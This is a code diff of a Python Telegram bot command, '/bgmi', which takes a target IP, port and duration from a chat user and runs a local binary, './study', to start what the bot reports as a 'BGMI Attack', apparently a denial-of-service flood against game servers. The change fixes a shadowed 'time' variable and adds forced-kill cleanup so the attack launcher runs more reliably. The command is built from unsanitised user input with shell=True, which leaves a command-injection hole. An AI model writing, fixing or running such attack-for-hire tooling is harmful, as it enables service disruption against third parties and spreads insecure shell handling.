@@ -286,6 +286,7 @@ def handle_bgmi(message):
     import threading
     import os
     import signal
+    import time
 
     user_id = str(message.chat.id)
 
@@ -315,42 +316,49 @@ def handle_bgmi(message):
 
     try:
         port = int(port_str)
-        time = int(time_str)
+        time_val = int(time_str)
     except ValueError:
         bot.reply_to(message, "❌ Port and time must be numbers.")
         return
 
-    if time > 600:
+    if time_val > 600:
         bot.reply_to(message, "⚠️ Error: Time interval must be less than 600 seconds.")
         return
 
     # Logging
-    record_command_logs(user_id, '/bgmi', target, port, time)
-    log_command(user_id, target, port, time)
-    start_attack_reply(message, target, port, time)
+    record_command_logs(user_id, '/bgmi', target, port, time_val)
+    log_command(user_id, target, port, time_val)
+    start_attack_reply(message, target, port, time_val)
 
-    full_command = f"./study {target} {port} {time} 200"
+    full_command = f"./study {target} {port} {time_val} 200"
 
     try:
         # Start the process in the background
         process = subprocess.Popen(full_command, shell=True, preexec_fn=os.setsid)
 
-        # Schedule termination after `time` seconds
+        # Schedule termination with SIGTERM and fallback SIGKILL
         def cleanup():
-            os.killpg(os.getpgid(process.pid), signal.SIGTERM)
+            try:
+                os.killpg(os.getpgid(process.pid), signal.SIGTERM)
+                time.sleep(3)  # Wait for graceful termination
+                if process.poll() is None:
+                    os.killpg(os.getpgid(process.pid), signal.SIGKILL)
+            except Exception as e:
+                print(f"Cleanup failed: {e}")
 
-        threading.Timer(time, cleanup).start()
+        threading.Timer(time_val, cleanup).start()
 
         response = (
             f"✅ BGMI Attack Started.\n"
             f"🎯 Target: {target}\n"
             f"📍 Port: {port}\n"
-            f"⏱️ Duration: {time}s\n"
-            f"🛑 Process will be auto-killed after {time} seconds."
+            f"⏱️ Duration: {time_val}s\n"
+            f"🛑 Process will be auto-killed after {time_val} seconds."
         )
 
     except Exception as e:
         response = f"❌ Error running attack: {str(e)}"
+
     bot.reply_to(message, response)
 
 # Add /mylogs command to display logs recorded for bgmi and website commands
